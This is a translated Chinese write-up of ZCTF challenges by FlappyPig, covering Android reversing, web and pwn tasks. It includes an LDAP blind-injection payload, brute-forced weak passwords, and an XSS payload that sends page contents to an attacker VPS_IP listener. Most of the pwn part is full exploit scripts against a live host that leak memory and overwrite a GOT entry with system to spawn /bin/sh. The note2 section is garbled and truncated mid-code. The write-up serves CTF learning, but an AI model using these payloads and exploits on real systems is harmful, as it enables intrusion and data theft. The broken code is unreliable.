# ZCTF Writeup
|
##### 译文声明
本文是翻译文章，文章来源：FlappyPig
译文仅供参考，具体内容表达以及含义原文为准。
****
**author:FlappyPig**
**MISC**
xctf 竞赛规则
这个题的脑洞 简直。。。
主要看spacing 可以看到3种间距 -2 0 2 于是推算 -2和2的时候
一个烫=一个0或者一个1
猜测开头
发现完全吻合之后 把所有168个烫都转换为二进制 最后8个二进制输出一个字符
得到flag
ZCTF{C0nnE_ON_B4BUj!}
**Android200**
首先出现的是登陆窗口,检查登录名密码的函数在这里
使用Auth.auth函数验证用户名密码,this.databaseopt()函数获得加密用的密钥,该函数如下图,大概是从key.db中获取密钥
下个log直接把key打印出来,是zctf{Notthis},因此用户名是zctf,密码应该是{Notthis}。
这一步通过了之后会运行app这个类,里面会检查反调试,并且设置了退出时间,把相应退出的转跳判断改掉就不会退出了。最后程序会调用JNIclass.sayHelloInc
用ida查看相关汇编
其中会调用Java_com_zctf_app_JNIclass_add_0()查看/proc/pid/status进行反调试,调试的时候把它的返回值改为0,即可绕过。
剩下的部分貌似是拼接/data/data/com.zctf.app/files/bottom和so文件内部的一个字符串,然后使用des解密。
这里直接用gdb dump出解密后的值即可,是一张图片。用stegsolve打开即可看到flag。
**WEB**
Web150 Easy Injection
一个登录框..测试了下感觉不像注入,cookie中有个sessionhint,发现是base32编码,解码发现是说不是sql注入,
扫 了下端口,发现存在389端口,ldap,参考drops的文章,用admin/*登录进后台,发现一个搜索,搜索a回显,0 admin, (|
(uid=*a*))猜测是后端的语句,这里又有一个sessionhint解出来can you find my description,后来才发现
description是表名,于是根据drops文章一位一位盲注出。
payload:search=b*)(description=z
Web200 加密的帖子
没啥好说的这题..你以为你换个DedeCMS的Logo我就认不出你是Discuz了么!
XSS漏洞,wooyun上有,在回复帖子的位置插入代码:
[flash]http://VPS_IP:9997/flash.swf?'+btoa(escape(document.body.innerHTML))+'[/flash]
VPS上nc监听9997端口,就能接收到数据了..
解码之后就能看到flag
老大知道flag
首先爆破常用姓名 最后可以登录zhangwei 123456
登录上去之后发现通讯录 还有md5过的cookie 解不开
然后爆破通讯录里的弱口令
可以得到 niubenben 123456789
继续登录 发现cookie可以解 解完之后是 9+ADk-
可以推算老大 是1+xxxx 最后尝试多次发现+ADk- 是utf-7的编码
于是构造老大的cookie
再md5下 用burp发包 拿到flag
**PWN**
guess(pwn100):
题目逻辑比较简单,gets的缓冲区是栈上的,可以任意长度读入,而栈的缓冲区长度是40。如下:
由于直接与flag相比较,所以这里flag是存在于内存中的。由于做了限制,必须以ZCTF{开头,而且长度一定,所以这里首先得暴力长度,根据返回的结果判断长度是否正确。
长度开始为33,后来改为34。
由 于栈的前面存在有主函数main(int argc, char** argv)的参数值,而这个参数argv[0]即为程序的名字,在异常时会显示在错
误信息后面,所以只要覆盖栈中argv[0]的地址为特定地址就可以达到任意地址泄露。所以可以泄露原flag的信息。
由 于::s(flag存放的地址)最后会与输入值做异或,所以最后只要反异或就可以。由于开始的时候ZCTF{这个地方异或后肯定为0,所以打印的时候,地
址应该往后靠点:如+5,另外选取的异或数也可能余flag中的相同,存在0截断,所以可以多打印些地址,这里直接选用‘b’,发现能够全部泄露出来(第五个5以后的)。
利用代码如下:
    __author__ = "pxx"
    #from zio import *
    from pwn import *
    #target = "./guess"
    target = ("115.28.27.103", 22222)
    def get_io(target):
    #r_m = COLORED(RAW, "green")
    #w_m = COLORED(RAW, "blue")
    #io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
    #io = process(target, timeout = 9999)
    io = remote("115.28.27.103", 22222, timeout = 9999)
    return  io 
    def leak_len(io, length):
    io.readuntil("please guess the flag:n")
    flag_addr = 0x6010C0
    payload = 'a' * length + "x00"
    #io.gdb_hint()
    io.writeline(payload)
    result = io.readuntil("n")
    print result
    #io.close(0)
    if "len error" in result:
    return False
    return True
    def pwn(io):
    #io.read_until("please guess the flag:n")
    io.readuntil("please guess the flag:n")
    """
    [stack] : 0x7fffff422210 --> 0x73736575672f2e (b'./guess')
    !![stack] : 0x7fffff421278 --> 0x7fffff422210 --> 0x73736575672f2e (b'./guess')
    [stack] : 0x7fffff422ff0 --> 0x73736575672f2e (b'./guess')
    !![stack] : 0x7fffff4215e0 --> 0x7fffff422ff0 --> 0x73736575672f2e (b'./guess')
    [stack] : 0x7fffc0eb7bfa --> 0x73736575672f6e (b'n/guess')
    [stack] : 0x7fffc0eb7ff0 --> 0x73736575672f2e (b'./guess')
    !![stack] : 0x7fffc0eb6c48 --> 0x7fffc0eb7ff0 --> 0x73736575672f2e (b'./guess')
    arg[0]: 0x7fffc0eb67c0 ('a' ...)
    """
    flag_addr = 0x6010C0 + 5 #+ 3 + 6
    length = 34
    payload = "ZCTF{"
    payload = payload.ljust(length, 'b')
    payload += "x00"
    payload = payload.ljust(0x7fffff421278 - 0x7fffff421150, 'a')
    #payload = payload.ljust(0x100, 'a')
    payload += p64(flag_addr)
    #payload = 'a' * (0x7fffc0eb68e8 - 0x7fffc0eb67c0) + p64(flag_addr)
    raw_input()
    #io.gdb_hint()
    #io.writeline(payload)
    #payload = 'a' * 0x50
    io.writeline(payload)
    #io.interact()
    io.interactive()
    """
    #leak length = 9
    for i in range(32, 256):
    print i
    io = get_io(target)
    if leak_len(io, i) == True:
    break
    exit(0)
    """
    io = get_io(target)
    pwn(io)
然后异或即可:
    a = '0x07x03SSS;=x0cQQ&=x16R=[x17x07x111=x04x0e"x05]x1fh'
    result = []
    for i in a:
    result.append(chr(ord(i) ^ ord('b')))
    print "".join(result)
结果:
flag: ZCTF{Rea111Y_n33D_t0_9uesS_fl@g?}
note1(pwn200):
这题比较简单,是个菜单式的交互程序,分析程序的结构体,得到如下:
可见content的长度为256,而在edit的时候,能够读入512字节,从而发送缓冲区覆盖,如下:
结构体中有指针,泄露和利用都比较容易,利用代码如下:
    __author__ = "pxx"
    from zio import *
    from pwn import *
    #target = "./note1"
    target = ("115.28.27.103", 9001)
    def get_io(target):
    r_m = COLORED(RAW, "green")
    w_m = COLORED(RAW, "blue")
    io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
    return  io 
    def new_note(io, title_t, type_t, content_t):
    io.read_until("option--->>n")
    io.writeline("1")
    io.read_until("title:n")
    io.writeline(title_t)
    io.read_until("type:n")
    io.writeline(type_t)
    io.read_until("content:n")
    io.writeline(content_t)
    def show_note(io):
    io.read_until("option--->>n")
    io.writeline("2")
    def edit_note(io, title_t, content_t):
    io.read_until("option--->>n")
    io.writeline("3")
    io.read_until("title:n")
    io.writeline(title_t)
    io.read_until("content:n")
    io.writeline(content_t)
    def pwn(io):
    new_note(io, 'aaa', 'aaa', 'aaa')
    new_note(io, 'bbb', 'bbb', 'bbb')
    new_note(io, 'ccc', 'ccc', 'ccc')
    show_note(io)
    atoi_got = 0x0000000000602068 - 0x80
    content= 'a' * 256 + l64(0x01) + l64(0x01) + l64(0x01) + l64(atoi_got) + "bbb"
    io.gdb_hint()
    edit_note(io, 'aaa', content)
    show_note(io)
    io.read_until("title=, type=, content=")
    data = io.read_until("n")[:-1]
    print [c for c in data]
    data = data.ljust(8, 'x00')
    malloc_addr = l64(data)
    print "malloc_addr:", hex(malloc_addr)
    elf_info = ELF("./libc-2.19.so")
    malloc_offset = elf_info.symbols["malloc"]
    system_offset = elf_info.symbols["system"]
    libc_base = malloc_addr - malloc_offset
    system_addr = libc_base + system_offset
    content = "a" * 16 + l64(system_addr)
    print "system_addr:", hex(system_addr)
    edit_note(io, "", content)
    io.read_until("option--->>n")
    io.writeline("/bin/sh")
    io.interact()
    io = get_io(target)
    pwn(io)
结果:
flag: ZCTF{3n@B1e_Nx_IS_n0t_3norrugH!!}
note2(pwn400):
这道题也是菜单式的形式,主要问题在于edit的时候,append可以越界,如下图:
如果size开始为0,那么size – strlen(dest) + 14 >n")
    io.writeline("1")
    io.read_until("content:(less than 128)n")
    io.writeline(str(length_t))
    io.read_until("content:n")
    io.writeline(content_t)
    def show_note(io, id_t):
    io.read_until("option--->>n")
    io.writeline("2")
    io.read_until("id of the note:n")
    io.writeline(str(id_t))
    def delete_note(io, id_t):
    io.read_until("option--->>n")
    io.writeline("2")
    io.read_until("id of the note:n")
    io.writeline(str(id_t))
    def edit_note(io, id_t, type_t, content_t):
    io.read_until("option--->>n")
    io.writeline("3")
    io.read_until("id of the note:n")
    io.writeline(str(id_t))
    io.read_until("[1.overwrite/2.append]n")
    io.writeline(str(type_t))
    io.read_until("Contents:")
    io.writeline(content_t)